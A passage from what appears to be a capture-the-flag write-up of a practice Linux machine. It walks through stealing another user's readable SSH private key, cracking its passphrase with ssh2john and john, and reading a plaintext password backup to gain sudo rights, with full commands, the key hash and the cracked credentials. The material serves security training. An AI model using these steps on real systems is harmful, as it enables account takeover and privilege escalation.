Are you sure you want to <span style=color:#66d9ef>continue</span> <span style=color:#a6e22e>connecting</span> <span style=color:#f92672>(</span>yes<span style=color:#f92672>/</span>no<span style=color:#f92672>/[</span>fingerprint<span style=color:#f92672>])?</span> yes
Warning: Permanently added <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span><span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span> to the list of known hosts<span style=color:#f92672>.</span>
jan<span style=color:#a6e22e>@10.10.137.134</span><span style=color:#960050;background-color:#1e0010>&#39;</span>s password<span style=color:#f92672>:</span> 
Welcome to Ubuntu <span style=color:#ae81ff>16.04</span><span style=color:#f92672>.</span><span style=color:#a6e22e>4</span> <span style=color:#a6e22e>LTS</span> <span style=color:#f92672>(</span>GNU<span style=color:#f92672>/</span>Linux <span style=color:#ae81ff>4.4</span><span style=color:#f92672>.</span><span style=color:#a6e22e>0</span><span style=color:#f92672>-</span><span style=color:#ae81ff>119</span><span style=color:#f92672>-</span>generic x86_64<span style=color:#f92672>)</span>

 <span style=color:#f92672>*</span> Documentation<span style=color:#f92672>:</span>  https<span style=color:#f92672>:</span><span style=color:#75715e>//help.ubuntu.com
</span><span style=color:#75715e></span> <span style=color:#f92672>*</span> Management<span style=color:#f92672>:</span>     https<span style=color:#f92672>:</span><span style=color:#75715e>//landscape.canonical.com
</span><span style=color:#75715e></span> <span style=color:#f92672>*</span> Support<span style=color:#f92672>:</span>        https<span style=color:#f92672>:</span><span style=color:#75715e>//ubuntu.com/advantage
</span><span style=color:#75715e></span>
<span style=color:#ae81ff>0</span> packages can be updated<span style=color:#f92672>.</span>
<span style=color:#ae81ff>0</span> updates are security updates<span style=color:#f92672>.</span>

The programs included <span style=color:#66d9ef>with</span> the Ubuntu system are free software<span style=color:#f92672>;</span>
the exact distribution terms <span style=color:#66d9ef>for</span> each program are described <span style=color:#66d9ef>in</span> the
individual files <span style=color:#66d9ef>in</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>doc<span style=color:#f92672>/*/</span>copyright<span style=color:#f92672>.</span>

Ubuntu comes <span style=color:#66d9ef>with</span> ABSOLUTELY NO WARRANTY<span style=color:#f92672>,</span> to the extent permitted by
applicable law<span style=color:#f92672>.</span>

The programs included <span style=color:#66d9ef>with</span> the Ubuntu system are free software<span style=color:#f92672>;</span>
the exact distribution terms <span style=color:#66d9ef>for</span> each program are described <span style=color:#66d9ef>in</span> the
individual files <span style=color:#66d9ef>in</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>doc<span style=color:#f92672>/*/</span>copyright<span style=color:#f92672>.</span>

Ubuntu comes <span style=color:#66d9ef>with</span> ABSOLUTELY NO WARRANTY<span style=color:#f92672>,</span> to the extent permitted by
applicable law<span style=color:#f92672>.</span>

Last login<span style=color:#f92672>:</span> Mon Apr <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>15</span><span style=color:#f92672>:</span><span style=color:#ae81ff>55</span><span style=color:#f92672>:</span><span style=color:#ae81ff>45</span> <span style=color:#ae81ff>2018</span> from <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#a6e22e>56</span><span style=color:#f92672>.</span><span style=color:#a6e22e>102</span>
jan<span style=color:#a6e22e>@basic2</span><span style=color:#f92672>:~</span>$ ls <span style=color:#f92672>-</span>al 
total <span style=color:#ae81ff>12</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>4</span> root root <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>..</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-------</span> <span style=color:#ae81ff>1</span> root jan    <span style=color:#ae81ff>47</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>lesshst</span>
jan<span style=color:#a6e22e>@basic2</span><span style=color:#f92672>:~</span>$ sudo <span style=color:#f92672>-</span>l 
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> jan<span style=color:#f92672>:</span> 
Sorry<span style=color:#f92672>,</span> <span style=color:#66d9ef>try</span> again<span style=color:#f92672>.</span>
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> jan<span style=color:#f92672>:</span> 
Sorry<span style=color:#f92672>,</span> user jan may not run sudo on basic2<span style=color:#f92672>.</span>
jan<span style=color:#a6e22e>@basic2</span><span style=color:#f92672>:~</span>$
</code></pre></div><hr><h2 id=privileges-escalation>Privileges Escalation<a hidden class=anchor aria-hidden=true href=#privileges-escalation>#</a></h2><p>Let&rsquo;s continue with the local enumeration. Since, we know there&rsquo;s another user <code>Key</code> in the machine. Let&rsquo;s check it&rsquo;s <code>directory</code> and it&rsquo;s <code>contents</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>jan<span style=color:#a6e22e>@basic2</span><span style=color:#f92672>:/</span>home<span style=color:#f92672>/</span>kay$ ls <span style=color:#f92672>-</span>al 
total <span style=color:#ae81ff>48</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>5</span> kay  kay  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>4</span> root root <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>..</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-------</span> <span style=color:#ae81ff>1</span> kay  kay   <span style=color:#ae81ff>756</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>bash_history</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> kay  kay   <span style=color:#ae81ff>220</span> Apr <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>bash_logout</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> kay  kay  <span style=color:#ae81ff>3771</span> Apr <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>bashrc</span>
drwx<span style=color:#f92672>------</span> <span style=color:#ae81ff>2</span> kay  kay  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>cache</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-------</span> <span style=color:#ae81ff>1</span> root kay   <span style=color:#ae81ff>119</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>lesshst</span>
drwxrwxr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>2</span> kay  kay  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>nano</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-------</span> <span style=color:#ae81ff>1</span> kay  kay    <span style=color:#ae81ff>57</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> pass<span style=color:#f92672>.</span><span style=color:#a6e22e>bak</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> kay  kay   <span style=color:#ae81ff>655</span> Apr <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>profile</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>2</span> kay  kay  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>ssh</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> kay  kay     <span style=color:#ae81ff>0</span> Apr <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>sudo_as_admin_successful</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-------</span> <span style=color:#ae81ff>1</span> root kay   <span style=color:#ae81ff>538</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>viminfo</span>
jan<span style=color:#a6e22e>@basic2</span><span style=color:#f92672>:/</span>home<span style=color:#f92672>/</span>kay$ 
jan<span style=color:#a6e22e>@basic2</span><span style=color:#f92672>:/</span>home<span style=color:#f92672>/</span>kay$ find <span style=color:#f92672>.</span><span style=color:#a6e22e>ssh</span><span style=color:#f92672>/</span> <span style=color:#f92672>-</span>ls
   <span style=color:#ae81ff>798691</span>      <span style=color:#ae81ff>4</span> drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x   <span style=color:#ae81ff>2</span> kay      kay          <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>ssh</span><span style=color:#f92672>/</span>
   <span style=color:#ae81ff>798921</span>      <span style=color:#ae81ff>4</span> <span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>   <span style=color:#ae81ff>1</span> kay      kay           <span style=color:#ae81ff>771</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>ssh</span><span style=color:#f92672>/</span>authorized_keys
   <span style=color:#ae81ff>798917</span>      <span style=color:#ae81ff>4</span> <span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span>   <span style=color:#ae81ff>1</span> kay      kay          <span style=color:#ae81ff>3326</span> Apr <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>ssh</span><span style=color:#f92672>/</span>id_rsa
   <span style=color:#ae81ff>798918</span>      <span style=color:#ae81ff>4</span> <span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span>   <span style=color:#ae81ff>1</span> kay      kay           <span style=color:#ae81ff>771</span> Apr <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>ssh</span><span style=color:#f92672>/</span>id_rsa<span style=color:#f92672>.</span><span style=color:#a6e22e>pub</span>
</code></pre></div><p>Oh wow! Can&rsquo;t read <code>pass.bak</code> but private SSH key file is <strong>readable</strong> by our user! Let&rsquo;s utilize this for <strong>SSH</strong> against <strong>Kay</strong>!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>jan<span style=color:#a6e22e>@basic2</span><span style=color:#f92672>:/</span>home<span style=color:#f92672>/</span>kay$ ssh <span style=color:#f92672>-</span>i <span style=color:#f92672>.</span><span style=color:#a6e22e>ssh</span><span style=color:#f92672>/</span>id_rsa key<span style=color:#a6e22e>@localhost</span>
Could not create directory <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>jan<span style=color:#f92672>/.</span><span style=color:#a6e22e>ssh</span><span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>.</span>
The authenticity of host <span style=color:#960050;background-color:#1e0010>&#39;</span>localhost <span style=color:#f92672>(::</span><span style=color:#ae81ff>1</span><span style=color:#f92672>)</span><span style=color:#960050;background-color:#1e0010>&#39;</span> can<span style=color:#960050;background-color:#1e0010>&#39;</span>t be established<span style=color:#f92672>.</span>
ECDSA key fingerprint <span style=color:#66d9ef>is</span> SHA256<span style=color:#f92672>:+</span>Fk53V<span style=color:#f92672>/</span>LB<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>pn4OPL7GN<span style=color:#f92672>/</span>DuVHVvO0lT9N4W5ifchySQ<span style=color:#f92672>.</span>
Are you sure you want to <span style=color:#66d9ef>continue</span> <span style=color:#a6e22e>connecting</span> <span style=color:#f92672>(</span>yes<span style=color:#f92672>/</span>no<span style=color:#f92672>)?</span> yes
Failed to add the host to the list of known <span style=color:#a6e22e>hosts</span> <span style=color:#f92672>(/</span>home<span style=color:#f92672>/</span>jan<span style=color:#f92672>/.</span><span style=color:#a6e22e>ssh</span><span style=color:#f92672>/</span>known_hosts<span style=color:#f92672>).</span>
key<span style=color:#a6e22e>@localhost</span><span style=color:#960050;background-color:#1e0010>&#39;</span>s password<span style=color:#f92672>:</span>
</code></pre></div><p>Ah well, the key is encrypted as well. We can identify that by either <code>SSHing</code> (and seeing the <code>password</code> ‚Äî <em>sometimes if the key is wrong, it still asks for password</em>) or checking the header (first 2-3 lines) of <code>id_rsa</code> file.</p><p>Download the file <code>id_rsa</code> locally and convert it to <code>john's</code> readable format for cracking using <a href=https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py>ssh2john</a>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> curl https<span style=color:#f92672>:</span><span style=color:#75715e>//raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py -O                                                                                                                   130 ‚®Ø
</span><span style=color:#75715e></span>  <span style=color:#f92672>%</span> Total    <span style=color:#f92672>%</span> Received <span style=color:#f92672>%</span> Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>8696</span>  <span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>8696</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>   <span style=color:#ae81ff>9949</span>      <span style=color:#ae81ff>0</span> <span style=color:#f92672>--:--:--</span> <span style=color:#f92672>--:--:--</span> <span style=color:#f92672>--:--:--</span>  <span style=color:#ae81ff>9938</span>

<span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> python3 ssh2john<span style=color:#f92672>.</span><span style=color:#a6e22e>py</span> id_rsa <span style=color:#f92672>&gt;</span> id_rsa<span style=color:#f92672>.</span><span style=color:#a6e22e>hash</span>
                                                                                                                                                                                                                   
<span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> cat id_rsa<span style=color:#f92672>.</span><span style=color:#a6e22e>hash</span> 
id_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712ef86e499d5cad1af838d19402729c471837fbdbe7eb172e8e9cd40ee52d959a3d772204241e305194ee7813ec99be3ced17455644ce550ad51edcb52b668bcb62e46b60a77e3cfc2e5bfe14c69db0d5d1be3c3f1d18867173d8f01ee7b00d5e88f62b3d91c81f740e14862548f318bfbf510bae62e9fae40d2bf15f36dd7d702400dfb74f9154e3d00454a049b599cb4c4070df59b18efd252d702a21a5f941f79731a70840e51608701396955798d946e01686edc557b350263e279f971eee37846e07d3594b8669d25a656c26f85046b05f44edf9529dea4ce1f8193469485640909d9dbfd4f9d45ab2ede8c6aca494a53674fb1e53bae5bcf02a6bacbea202bfc284db9d3ae446780aa8b431325948599c9ee32acb1137dcdbbe61cd555887a1642e0b4e7da972d1b32a188accf9e595a173ab64f065bfc8b23530dd0c4de3463a9b38694fb34d6101628847150f684af5f25719f8e958d34570da834bdb129482d4295768f01f4e3219d5db7c92d85a55f19c926954c84a0ba6bbe697b8655c5f98cb7441c2b8a0a3b569118ca8b14dc1a3f125857a1dab94a1513137b6d4a68f9e2d856ce66a39b5ba560e18b43517e718fd6de9b9fb4ef6fbec009ac86cc774ba4802a666bffd21c114e7adb455858d4251fef118d99b9b3607ccd130329a44da2f261526951422440b7703827e53bd05177e1e82249455ae177157256a563b28b7e0b317b99b5a6e6716c4cf3e53a79dd0ba266ad41148de21b2f305c5ba6d7e6cf9bf7978579c79632655e0745a1aa73ed0ed56d837b05763c69d218065ea2b86c03019cce1c84570aed1a6f0918ec2b25985440c9318bdcf3b674cacbcea559fd5a714e51d38df94e2960fe8f98d53865dd907a434859811764864ccb2a6e18215d03448045febf90ac06a073800822b78a101028a6cef927e581705a1d76fa934a1c31001620ec5826e9cf28df1bcf39502c9b3526b65789b86555a3de57b5f6e4d694caee6ee1b82d1616ff7fc68129b7a5e1795647ee07c5ba2da49c7a45507210f67f91588eab74b51a9c074916689f7db4c40e2138f91c1bae890f21e54ba077dbcb95888e836ba7eb6223a70384c48c94cf3b946971210a40a220eb980809ba5c5a3d54e08f6610765e1dcd2bda5cae7d96e77d852bd2a095a3cfa64bc5fbe6c79ea0dcfc6ae40be03238217213ab9b1a0873f8cbf9ed9b3d40dd0d0536365702a7452bf85301d84c4397621979cdc37b5b983f301af78655f352684c57799037f633a09b755ba0de9c017a73d76e0a8f46c4c33c4207358a8b408f1c52d8b8ca0378ba8ffcd224a125e5a0973c6997a6225e51007e600c22d3e24ebbc1e8bd8ff250eb32d44f4bd298ba27a3522215db0c3b89d49f2277cfedd74c3b59a1497936263826308f2e14cd363025aa7a5c39aa9a77b815dd10ff6ac9a5d8bda4074513f0fad3b6df926da5ca3c51f47479a8c271a60dab493fe78cadce92f3debe1c05ef72f3f194a36d23bfa3b0d4f0b8f04236d485be8d7d97dfb1c5de79613568d58f113308e8a73c7b87ca11b7b53e63d37f055b5bb7e5f39982e7bbedea3aae16daa3b29ccd8f9d98d53e97a1fbc0c1a2e701e5b7d7b224a4371358b02103e25b29c54138b8c4b7c9706967fe384b263c284ceb0336887e7da79e3c10d54d85689c0db4c379388b2138d0c40017fd2256aae3a2d21a93116a134d5f0ce8ce1fbf2c61509868c823fccdff62aca54796ff99aa5b0bc588af10537f26eccfa6962e595fbeac9df244f6cbaf6b77a11cfd8078de615833305fe0ae0d22173e8d744435fe3a69a81313109f9c5cdcb56d67544a36aa27a3b7c0db50b3b829972368ff2ed998c1910b392720c0d4cbaa907a49f2c38f970503971d64b6972f5b7b5c34735a08129c2b7ee82c6ccc49ddc943a5ae2f4467c5d7a07859e39ae00023c771d59caca0817ce412d35849abd9d225ed96e34de5266b31fd4dd82dab9469582b1e41687a39f108da54b6e84771542cb11f5c522e62b79b6867e8a20df2e8c9bf9ff36634c0de536fa3d377fa27543b6c90895f13bdf50f03b2dd97e5d25d452fa6a0d225704eb3c19751864285dfe3031bc2ff5b0c5d19a7feae6ad5625757477aa3c3f0eb635717f1f5b9037b3a76425db2a2151e2810eefbb75853d939360d1240093b2497a8903eff9b98bc705c2afe0e5541af2bb06b0ec50e4caf798a7f59ffc3a3e70565d887b9f694bdfa64d15a70ed55eacccc69af3fe3cf5aa5b6e3a7186eb5036e12efe53fcc509719a6a6f3ec0c008cb6a035229a1597d9be6beb13444d84c93f2164844c8ae69aa13648578087b98e90dd03f9da47d9ce306dddc88dd80998bf6d3910d209bebb1a70f8b73d944d949b1b1b19b13a455776f3c2e6647fa6722fc2bad5b202502684e91514a11e3437a92a09febffcfc3d55095b43e14b0567e8f5cbd91728b693fe82b8f75ccaf27c0651152faaf0610d2edcabc0b9ac51895180fbf60b868771dee58edb97e99d5ca3592cc9733a76ae0b96ca5788be62e8fb006204c574482579701781b46ec979bdbc9d339e57967051ca87fadae7184bd79cac0af834632081c5df6189dcc4cc8a0170cac12c30c1fff21c4c17f20813112bf901df81c5d78ca22024f1cd58cb5b73c1d68c6529ce4b21d7b95941e099f9a6140bdd1f0ead9113b2e5f17c354aacf79a38a104d6f844559417552387182ba20d890203a6a5e9661d23d8b6fae351a208ef5550555592011fec39609858b6b22743b0cca80c97d58076a660be95e460177cab3fd6b690b01a0e4f5d0507157afe9c4dc7f384187256a9a5d56ab00d466d44e4f07e5f348e8f100e5abe1c4d1bbc207fa3617140a604b607c7e3f5020f9aabb0700ad790e7847e085eb2243e503bf7d097ae15a2ee6179262e351773bb880123c0a87a43f62380fbe08fc2c63ac08ffe2ba0c6deeefbdd49eeaa2ffd1053aceec67b25f92dcfd25b58fa4fab2328481af26f5f4b5d21e1312b78f913b7f08254b064336d84c1aa3c82582e1cde55b5a347d264cb9e98df34b5490831e5d212b38b7cd999daf186a97efd6250e1e6820079358542f77ac78ddd9a505919c318000fc47f8b80fc84f12cf58adf1a3ee3fc8190015058c16c414cc0d6017b9a1fb032ee20e842573b30fc3214ac5fb8962437477e81bb6479fa498f148924796d6d616218ec2a5fa0949def8542dc9b75fd95b75c26fbe91ef9b06e61e90e0df20bb973f33471dab5e87f4c1f0a5d8a7f4e653a8edb337116fa6e5ed858
</code></pre></div><p>Let&rsquo;s get <code>cracking</code>!</p><p><strong>Cracked successfully</strong> and <em><strong>fast this time</strong></em>! üòÅ</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> john id_rsa<span style=color:#f92672>.</span><span style=color:#a6e22e>hash</span> <span style=color:#f92672>--</span>wordlist<span style=color:#f92672>=/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>wordlists<span style=color:#f92672>/</span>rockyou<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>                                                                                                                                               <span style=color:#ae81ff>1</span> <span style=color:#960050;background-color:#1e0010>‚®Ø</span>
Using <span style=color:#66d9ef>default</span> input encoding<span style=color:#f92672>:</span> UTF<span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>
Loaded <span style=color:#ae81ff>1</span> password <span style=color:#a6e22e>hash</span> <span style=color:#f92672>(</span>SSH <span style=color:#f92672>[</span>RSA<span style=color:#f92672>/</span>DSA<span style=color:#f92672>/</span>EC<span style=color:#f92672>/</span>OPENSSH <span style=color:#f92672>(</span>SSH <span style=color:#66d9ef>private</span> keys<span style=color:#f92672>)</span> <span style=color:#ae81ff>32</span><span style=color:#f92672>/</span><span style=color:#ae81ff>64</span><span style=color:#f92672>])</span>
Cost <span style=color:#a6e22e>1</span> <span style=color:#f92672>(</span>KDF<span style=color:#f92672>/</span>cipher <span style=color:#f92672>[</span><span style=color:#ae81ff>0</span><span style=color:#f92672>=</span>MD5<span style=color:#f92672>/</span>AES <span style=color:#ae81ff>1</span><span style=color:#f92672>=</span>MD5<span style=color:#f92672>/</span><span style=color:#ae81ff>3</span>DES <span style=color:#ae81ff>2</span><span style=color:#f92672>=</span>Bcrypt<span style=color:#f92672>/</span>AES<span style=color:#f92672>])</span> <span style=color:#66d9ef>is</span> <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>for</span> all loaded hashes
Cost <span style=color:#a6e22e>2</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> <span style=color:#66d9ef>is</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>for</span> all loaded hashes
Will run <span style=color:#ae81ff>4</span> OpenMP threads
Note: This format may emit <span style=color:#66d9ef>false</span> positives<span style=color:#f92672>,</span> so it will keep trying even after
finding a possible candidate<span style=color:#f92672>.</span>
Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl<span style=color:#f92672>-</span>C to abort<span style=color:#f92672>,</span> almost any other key <span style=color:#66d9ef>for</span> status
<span style=color:#a6e22e>beeswax</span>          <span style=color:#f92672>(</span>id_rsa<span style=color:#f92672>)</span>
Warning: Only <span style=color:#ae81ff>2</span> candidates left<span style=color:#f92672>,</span> minimum <span style=color:#ae81ff>4</span> needed <span style=color:#66d9ef>for</span> performance<span style=color:#f92672>.</span>
<span style=color:#ae81ff>1</span>g <span style=color:#ae81ff>0</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>03</span> <span style=color:#a6e22e>DONE</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>11</span> <span style=color:#ae81ff>04</span><span style=color:#f92672>:</span><span style=color:#ae81ff>26</span><span style=color:#f92672>)</span> <span style=color:#ae81ff>0.2710</span>g<span style=color:#f92672>/</span>s <span style=color:#ae81ff>3886</span>Kp<span style=color:#f92672>/</span>s <span style=color:#ae81ff>3886</span>Kc<span style=color:#f92672>/</span>s <span style=color:#ae81ff>3886</span>KC<span style=color:#f92672>/</span>sa6_123<span style=color:#f92672>..*</span><span style=color:#ae81ff>7</span><span style=color:#960050;background-color:#1e0010>¬°</span>Vamos<span style=color:#f92672>!</span>
Session completed
</code></pre></div><p>Let&rsquo;s SSH into the machine utilizing the <code>id_rsa</code> and <code>password</code> cracked now!</p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%204.png alt=/images/thm-basic_pentesting/Untitled%204.png></p><p>Remember, we can&rsquo;t still do <code>sudo -l</code> since that requires <code>user password</code> while we only have the key&rsquo;s password.</p><p>I did that try the cracked key password though, but it didn&rsquo;t work!</p><p>See that pass.bak file there? üòè Let&rsquo;s check it&rsquo;s contents.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>kay<span style=color:#a6e22e>@basic2</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> cat <span style=color:#66d9ef>pass</span><span style=color:#f92672>.</span>bak
heresareallystrongpasswordthatfollowsthepasswordpolicy<span style=color:#960050;background-color:#1e0010>$$</span>
</code></pre></div><h2 id=root-user>Root User!<a hidden class=anchor aria-hidden=true href=#root-user>#</a></h2><p>Used the <strong>password</strong> and we can <strong>run any binary</strong> as any user with <code>sudo</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>kay<span style=color:#a6e22e>@basic2</span><span style=color:#f92672>:~</span>$ sudo <span style=color:#f92672>-</span>l 
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> kay<span style=color:#f92672>:</span> 
Matching Defaults entries <span style=color:#66d9ef>for</span> kay on basic2<span style=color:#f92672>:</span>
    env_reset<span style=color:#f92672>,</span> mail_badpass<span style=color:#f92672>,</span> secure_path<span style=color:#f92672>=/</span>usr<span style=color:#f92672>/</span>local<span style=color:#f92672>/</span>sbin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>usr<span style=color:#f92672>/</span>local<span style=color:#f92672>/</span>bin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>sbin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>bin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>snap<span style=color:#f92672>/</span>bin

